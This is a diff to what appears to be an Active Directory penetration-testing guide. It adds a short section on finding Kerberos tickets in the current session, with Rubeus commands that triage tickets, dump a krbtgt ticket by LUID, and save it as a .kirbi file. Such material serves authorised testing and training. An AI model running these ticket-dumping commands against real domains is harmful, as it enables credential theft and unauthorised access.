@@ -160,6 +160,18 @@ If you have compromised credentials or a session as a regular domain user and yo
 
 There is a complete page in this book about [**local privilege escalation in Windows**](../windows-local-privilege-escalation/) and a [**checklist**](../checklist-windows-privilege-escalation.md). Also, don't forget to use [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).
 
+### Current Session Tickets
+
+It's very **unlikely** that you will find **tickets** in the current user **giving you permission to access** unexpected resources, but you could check:
+
+```bash
+## List all tickets (if not admin, only current user tickets)
+.\Rubeus.exe triage
+## Dump the interesting one by luid
+.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
+[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
+```
+
 ## Privilege escalation on Active Directory WITH privileged credentials/session
 
 **For the following techniques a regular domain user is not enough, you need some special privileges/credentials to perform these attacks.**
